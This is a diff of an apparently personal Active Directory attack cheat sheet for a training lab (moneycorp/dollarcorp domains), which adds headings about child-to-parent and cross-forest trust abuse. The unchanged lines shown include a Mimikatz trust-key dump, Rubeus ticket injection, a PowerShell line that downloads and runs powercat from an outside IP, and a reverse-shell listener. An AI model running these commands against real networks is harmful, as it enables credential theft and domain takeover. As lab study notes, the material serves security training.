@@ -3100,7 +3100,7 @@ Enter-PSSession $MYSESSION
 Invoke-Mimikatz -Command '"lsadump::trust /patch"'
 ```
 ---
-##### MIMIKATZ - TRUST INTER DOMAIN
+##### MIMIKATZ - TRUST INTER DOMAIN (CHILD TO PARENT)
 1. LIST DOMAIN TRUST
 ```
 Get-Netdomaintrust
@@ -3151,7 +3151,7 @@ ou
 ```
 .\Rubeus.exe ptt /ticket:CIFS.mcorp-dc.moneycorp.local.kirbi
 ```
-##### MIMIKATZ - TRUST INTER DOMAIN USING DOMAIN ADMIN(KRBTGT)
+##### MIMIKATZ - TRUST INTER DOMAIN USING DOMAIN ADMIN(KRBTGT)  (CHILD TO PARENT)
 Using DA access to dollarcorp.moneycorp.local, escalate privileges to Enterprise Admin or DA to the parent domain, moneycorp.local using dollarcorp's krbtgt hash.
 
 1. GERAR GOLDEN TICKET PARA ADMINSTRATOR
@@ -3180,3 +3180,5 @@ schtasks /RUN /S mcorp-dc.moneycorp.local /TN "DOWNLOAD"
 IEX(New-Object System.Net.WebClient).DownloadString("http://172.16.99.209/oscp/powercat.ps1")
 powercat -l -p 666 -v
 ```
+##### MIMIKATZ - TRUST ACROSS FOREST BOUNDARY (DOMINIOS EXTERNOS)
+With DA privileges on dollarcorp.moneycorp.local, get access to SharedwithDCorp share on the DC of eurocorp.local forest.
